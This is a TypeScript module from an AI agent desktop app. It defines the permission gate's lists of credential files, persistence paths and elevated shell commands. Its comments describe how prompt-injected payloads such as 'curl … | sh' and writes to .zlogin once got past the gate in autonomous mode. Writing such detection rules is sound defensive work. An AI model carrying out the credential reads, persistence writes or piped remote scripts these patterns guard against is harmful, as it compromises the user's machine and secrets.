// Galactus, what the permission gate treats as sensitive.
//
// A module of its own, with no import, for one reason: agent.ts pulls in the
// Tauri bridge and the DOM, so it cannot be loaded by the Node test runner,
// and these two lists are exactly the part that must never drift untested.
// Both were wrong in a shipped build, both were exploited in a reproduction,
// and both are now pinned by tools/gate.

export const SENSITIVE_WRITE_PREFIXES = ["/System", "/Library", "/usr", "/bin", "/sbin", "/etc", "/private"];

// Persistence / credential paths under $HOME are just as system-modifying as
// /System: writing them silently would allow login hooks or key injection.
// The bin directories are the ones the backend prepends to PATH when it
// resolves MCP connector commands: a file dropped there is executed by the
// app itself on the next connector reload.
// `.zlogin` is on this list for the sharpest reason of the lot: run_command
// spawns `/bin/zsh -lc`, a LOGIN shell, which sources `.zprofile` and
// `.zlogin` and does NOT source `.zshrc`. Measured on macOS against a scratch
// ZDOTDIR: only ZPROFILE and ZLOGIN echoed. The one startup file the app
// itself executes on every shell tool was therefore the one file missing
// here, and in autonomous mode a write to it took no dialog at all: the
// payload ran on the next command and on every login shell the user opened
// afterwards, outliving the app.
export const SENSITIVE_WRITE_PATTERNS = [
  /\/Library\/(LaunchAgents|LaunchDaemons)\//,
  /\/\.ssh\//,
  /\/\.(zshrc|zshenv|zprofile|zlogin|zlogout|bashrc|bash_profile|bash_login|bash_logout|profile)$/,
  /\/\.gitconfig$/,
  // A repository's own config is executable configuration: core.fsmonitor,
  // core.pager and core.sshCommand are commands git runs on the next ordinary
  // operation, and the Code view runs `git status` by itself when a folder is
  // opened. The hooks directory is the same thing with fewer steps. Only
  // ~/.gitconfig was here, which covered the least likely of the three.
  /\/\.git\/config$/,
  /\/\.git\/hooks\//,
  /\/\.config\/git\/config$/,
  /^\/opt\/homebrew\/s?bin\//,
  /\/\.(local|bun|cargo|volta)\/bin\//,
];

/**
 * Paths whose CONTENTS are a credential, so reading them is elevated.
 *
 * There was no such list: every read was ordinary. An elevated request never
 * auto-approves and never becomes a standing rule, so these ask every time,
 * whatever the autonomy level.
 *
 * The app's own settings file is here on purpose: it carries each MCP
 * connector's environment block, which is where the user's API tokens live.
 */
const SENSITIVE_READ_PATTERNS = [
  /\/\.ssh\//,
  /\/\.aws\//,
  /\/\.gnupg\//,
  /\/\.docker\/config\.json$/,
  /\/\.netrc$/,
  /\/\.npmrc$/,
  /\/\.pypirc$/,
  /\/\.git-credentials$/,
  /\/Library\/Keychains\//,
  /\/Library\/Application Support\/Galactus\/settings\.json$/,
  /\/\.env(\.[\w.-]+)?$/,
  // Any private key by extension. The one that made this obvious is the
  // updater signing key: it lives in ~/.galactus/, it signs the manifest every
  // installation trusts, and reading it was an ordinary read.
  /\.(key|pem|p12|pfx)$/,
  /\/\.galactus\//,
  /\/\.kube\//,
  /\/\.config\/gh\//,
  /\/\.config\/gcloud\//,
];

/** True when reading this path hands over a secret. */
export function isElevatedRead(path: string): boolean {
  return SENSITIVE_READ_PATTERNS.some((re) => re.test(path));
}

/** True when writing this path changes how the machine behaves. */
export function isElevatedWrite(path: string): boolean {
  return (
    SENSITIVE_WRITE_PREFIXES.some((p) => path.startsWith(p)) ||
    SENSITIVE_WRITE_PATTERNS.some((re) => re.test(path))
  );
}

// ---------------------------------------------------------------- commands
//
// `isElevatedCommand` lived in agent.ts, which the Node runner cannot load.
// It moved here, unchanged, the day a second caller appeared that also has to
// be testable: learned.ts refuses to persist a self-authored skill whose
// commands are elevated, and a copy of this list inside that module would be
// a list that drifts. agent.ts re-exports it, so every existing import keeps
// working and there is still exactly one definition.

const ELEVATED_PATTERNS = [
  /\bsudo\b/,
  /\bdiskutil\b/,
  /\bkillall\b/,
  /\blaunchctl\b/,
  /\bcsrutil\b/,
  /\/System\//,
  /\/Library\/(?!Caches)/,
  /\bchmod\s+[0-7]*7[0-7]*\s+\//,
  // Symbolic execute grants (+x, u+x, a+rx…): the octal pattern above only
  // catches a 7 digit, and making a dropped file executable IS the payload.
  /\bchmod\b[^|;&\n]*\+\w*[xX]/,
  /\bmkfs\b/,
  /\bshred\b/,
  /\bdd\s+.*of=\/dev\//,
  /\bfind\b.*\s-delete\b/,
  /\bgit\s+reset\s+--hard\b/,
  /\bgit\s+clean\b/,
  /\bgit\s+checkout\s+--\s/,
];

/**
 * Interpreters that run a program handed to them on the command line or on
 * standard input. `curl … | sh` is the canonical payload of a prompt injection,
 * and it used to pass this filter untouched because the nested-shell test
 * insisted on a `-c`.
 */
const INTERPRETERS = "sh|bash|zsh|dash|ksh|fish|python3?|perl|ruby|node|osascript|deno|bun";

/** Where a shell command writes, as far as this can tell without a parser. */
export function commandWriteTargets(cmd: string): string[] {
  const out: string[] = [];
  for (const seg of cmd.split(/[|;&\n()`]+/)) {
    const toks = seg.trim().split(/\s+/).filter(Boolean);
    for (let i = 0; i < toks.length; i++) {
      const tok = toks[i];
      // Redirections, joined (>file) or separate (> file).
      const redirect = tok.match(/^\d*>>?(.*)$/);
      if (redirect) {
        const target = redirect[1] || toks[i + 1] || "";
        if (target) out.push(target);
        continue;
      }
      const name = tok.split("/").pop() ?? "";
      // tee writes every path it is given; cp, mv and ln write the last one.
      if (name === "tee") {
        out.push(...toks.slice(i + 1).filter((a) => !a.startsWith("-")));
      } else if (name === "cp" || name === "mv" || name === "ln" || name === "install") {
        const args = toks.slice(i + 1).filter((a) => !a.startsWith("-"));
        if (args.length > 1) out.push(args[args.length - 1]);
      }
    }
  }
  // ~ is what a person types and what a payload types; the lists match on
  // absolute paths, so it is expanded to something they can see.
  return out.map((p) => p.replace(/^~(?=\/|$)/, "/Users/x"));
}

export function isElevatedCommand(cmd: string): boolean {
  if (ELEVATED_PATTERNS.some((re) => re.test(cmd))) return true;
  // Destructive rm in ANY flag layout: `rm -rf`, `rm -r -f`, `rm --recursive`,
  // `rm -f x` … Split on every separator that can chain commands, newlines,
  // subshell parens, backticks and `$` included, so `$(rm …)` and `` `rm …` ``
  // substitutions are scanned as their own segments, and scan EVERY `rm`
  // token by BASENAME: `/bin/rm` must not slip past a whole-token compare,
  // and an indexOf of the first occurrence misses `echo ok && rm …`,
  // `for …; do rm …; done`, and `VAR=1 rm …`. Over-matching (a quoted
  // "rm -rf" in an echo) only costs an extra confirmation, under-matching
  // costs the user's files.
  for (const seg of cmd.split(/[|;&\n()$`]+/)) {
    const toks = seg.trim().split(/\s+/);
    for (let i = 0; i < toks.length; i++) {
      if ((toks[i].split("/").pop() ?? "") !== "rm") continue;
      const flags = toks.slice(i + 1).filter((tk) => tk.startsWith("-"));
      if (flags.some((tk) => /^-[a-zA-Z]*[rRf]/.test(tk) || tk === "--recursive" || tk === "--force")) {
        return true;
      }
    }
  }
  // A nested shell (`sh -c '…'`, `zsh -lc "…"`, `/bin/sh -c '…'`) makes the
  // real command opaque to this filter: treat it as elevated rather than
  // guess. The prefix class includes "/", "$" and backtick so path-qualified
  // shells and substitutions are caught too.
  if (/(?:^|[\s|;&($`\/])(?:sh|bash|zsh|dash|ksh)\b[^|;&\n]*\s-\w*c\b/.test(cmd)) return true;
  // Anything PIPED INTO an interpreter. This is the shape of nearly every
  // real-world payload, and the -c test above never saw it because there is no
  // -c: `curl -s http://x/i.sh | sh` reads as an ordinary curl.
  if (new RegExp(`\\|\\s*(?:sudo\\s+)?(?:[\\w./-]*/)?(?:${INTERPRETERS})\\b`).test(cmd)) return true;
  // A program given inline: python3 -c, node -e, perl -E, osascript -e. Same
  // opacity as sh -c, and osascript -e reaches "with administrator privileges".
  if (new RegExp(`(?:^|[\\s|;&($\`/])(?:[\\w./-]*/)?(?:${INTERPRETERS})\\b[^|;&\\n]*\\s-\\w*[ceE]\\b`).test(cmd)) {
    return true;
  }
  // eval, and sourcing a file: both run text as code in the current shell.
  if (/(?:^|[\s|;&($`])eval\b/.test(cmd)) return true;
  if (/(?:^|[\s|;&($`])(?:source|\.)\s+[^\s]/.test(cmd)) return true;
  // Finally: where does it WRITE. isElevatedWrite already knows which paths
  // change how the machine behaves; run_command simply never asked it, so the
  // same payload was elevated through write_file and silent through the shell.
  if (commandWriteTargets(cmd).some((p) => isElevatedWrite(p))) return true;
  return false;
}

/**
 * Whether an MCP tool call deserves the elevated dialog.
 *
 * Every connector call used to be declared ordinary, in one hard-coded
 * `elevated: false`. That put `ssh_execute_sudo`, `write_note` and
 * `create_or_update_file` on the same footing as `list_servers`, and in
 * autonomous mode it meant no dialog at all, ever, for any connector.
 *
 * A connector is a third-party program, so this cannot be a list of known
 * tools. Two things are checked instead: what the tool's NAME says it does,
 * and where its ARGUMENTS point. The second is the one that matters, since it
 * reuses the same path lists as write_file: the filesystem connector writing
 * `~/.zshrc` now raises exactly the dialog that `write_file` would have.
 */
const MCP_DANGEROUS_VERBS =
  /(^|_)(exec|execute|run|shell|sudo|spawn|kill|write|create|update|delete|remove|rm|drop|deploy|upload|push|publish|send|install|restart|move|rename)($|_)/i;

export function isElevatedMcp(tool: string, args: Record<string, unknown>): boolean {
  if (MCP_DANGEROUS_VERBS.test(tool)) return true;
  for (const value of Object.values(args ?? {})) {
    if (typeof value !== "string") continue;
    // Only things that look like a path: a prose argument must not raise a
    // dialog on every call, or the dialog stops meaning anything.
    if (!value.startsWith("/") && !value.startsWith("~")) continue;
    const path = value.replace(/^~(?=\/|$)/, "/Users/x");
    if (isElevatedWrite(path) || isElevatedRead(path)) return true;
  }
  return false;
}

/**
 * Whether a shell command pushes to, or pulls from, a remote.
 *
 * WHY THIS EXISTS. The Code view's Push and Pull buttons ask with kind "git"
 * and noAlways, which is what makes an unattended run stop and ask a human.
 * The model never used those buttons: it ran `git push` through run_command,
 * which is kind "shell", which an autonomous run grants silently. So the one
 * gate the runs form describes in detail, and the toggle offered next to it,
 * could not fire for the only actor they were written for, while the help text
 * told the reader those two commands were the last thing that would still stop
 * a run. They were not stopped at all.
 *
 * Deliberately narrow. This is not a git parser: it recognises the two verbs
 * that reach the network and leaves every local command alone, because a run
 * that has to ask before `git status` is a run nobody will use.
 */
export function isNetworkGitCommand(command: string): boolean {
  // Each segment of a compound command, so `cd x && git push` is caught while
  // `echo "git push"` is not: the verb has to START a command.
  // Split on everything that starts a new command, pipes and subshells
  // included: `(git push)` and `cd x | git push` used to read as "not git at
  // all", because the verb was only looked for at the head of a segment.
  for (const part of command.split(/(?:&&|\|\||[|;\n()`])/)) {
    const verb = gitSubcommand(part);
    if (verb !== null && NETWORK_GIT.has(verb)) return true;
    // And an assignment prefix, which is how a payload reaches the network
    // while looking like configuration: GIT_SSH_COMMAND=… git push.
    // The value can be quoted and contain spaces, which is exactly how the
    // interesting case is written: GIT_SSH_COMMAND='ssh -i /tmp/key' git push.
    const bare = part
      .trim()
      .replace(/^(?:[A-Za-z_][A-Za-z0-9_]*=(?:'[^']*'|"[^"]*"|[^\s]*)\s+)+/, "");
    const second = gitSubcommand(bare);
    if (second !== null && NETWORK_GIT.has(second)) return true;
  }
  return false;
}

/** The two verbs that reach a remote, plus the ones that create the link. */
const NETWORK_GIT = new Set(["push", "pull", "fetch", "clone"]);

/**
 * The subcommand of one shell segment, or null when it is not a git call.
 *
 * A regex over the whole line is not enough, and the case that proves it is
 * `git -C /tmp/repo push`: the global option carries a value, so the verb is
 * the fourth token, not the second. Walking the tokens and skipping options
 * (and the value of the ones that take one) is what makes the answer right for
 * a real command line instead of for the shape of the common case.
 */
function gitSubcommand(segment: string): string | null {
  const tokens = segment.trim().split(/\s+/).filter(Boolean);
  let i = 0;
  // Wrappers that precede the command without changing what it is.
  while (i < tokens.length && /^(sudo|env|nice|time|command)$/.test(tokens[i])) i += 1;
  if (tokens[i] !== "git") return null;
  i += 1;
  while (i < tokens.length && tokens[i].startsWith("-")) {
    const opt = tokens[i];
    i += 1;
    // These take a separate value unless it was joined with "=".
    if (/^(-C|-c|--git-dir|--work-tree|--namespace|--exec-path)$/.test(opt)) i += 1;
  }
  return tokens[i] ?? null;
}
